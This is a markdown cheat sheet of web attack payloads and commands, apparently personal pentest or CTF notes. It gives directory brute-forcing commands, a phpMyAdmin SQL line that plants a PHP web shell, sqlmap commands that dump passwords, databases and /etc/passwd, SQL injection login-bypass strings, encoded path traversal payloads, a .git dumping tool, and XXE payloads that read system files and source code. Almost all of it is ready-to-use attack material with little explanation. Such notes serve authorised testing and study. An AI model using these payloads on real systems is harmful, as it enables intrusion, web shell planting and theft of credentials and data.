# 🕸️ Web

- [BruteForce](#bruteforce)
- [Download .git](#download-.git)
- [Influx DB](#influx-db)
- [Mysql](#mysql)
- [Path traversal](#path-traversal)
- [PhpMyAdmin](#phpmyadmin)
- [Request](#request)
- [SQL Injection](#sql-injection)
- [XML external entity (XXE)](#xml-external-entity-xxe)

## BruteForce
### Wordlist

| Name                      | Path                                                                    |
|:--------------------------|:------------------------------------------------------------------------|
| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |

### ffuf
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
```
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
```

### Gobuster
```
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Dirb
```
dirb url -R
```

### GUI
```
dirbuster
```
```
owasp-zap
```

## PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

## MySql
### Connect to mysql
```
mysql -h localhost -u myname -p
```
### Show Info
```
SHOW DATABASES;
use db_name
SHOW TABLES;
select * from table_name
```
### Open SQLite3
```
sqlite3 database.sqlite3
```
or open in vs code

## Influx DB

[CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

```
> show databases # to display databases
> show field keys # field keys (like columns in sql)
> show measurements # to display measurements (like tables in sql)
{
  ...
  "results": [
    "values": [
        [
            <strong>"foo"</strong>
        ]
    ]
  ...
}
> select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
```

## SQL Injection
### SQLmap
```
# See Vulnerability
sqlmap -r req --batch
# Check Passwords
sqlmap -r req --batch --passwords
# Get DB
sqlmap -r req --batch --dbs
sqlmap -r req --batch --fetch --tables -D db
sqlmap -r req --batch --dump -T table -D db
# Check Privilege of DB
sqlmap -r req --privileges
# Read file
sqlmap -r req --file-read=/etc/passwd
```

## Pattern
```
" OR ""="
' OR ''='
' OR 1=1 -- comment
```

## Request
### Curl
```
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
```

### Python (requests)
```python
import requests

s = requests.session()
# s.proxies = {
#   "http": "localhost:8080",
#   "https": "localhost:8080",
# }

r = s.get('http://example.com')
print(r.text)
r = s.post('http://example.com/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
    # auth=('username', 'password')
)
print(r.status_code, r.url)
```

## Path traversal

[Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)

[File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

```
︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
```

## Download .git
```
githacker --url http://url/.git/ --folder result
```
[Source](https://github.com/WangYihang/GitHacker)

## XML external entity (XXE)
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```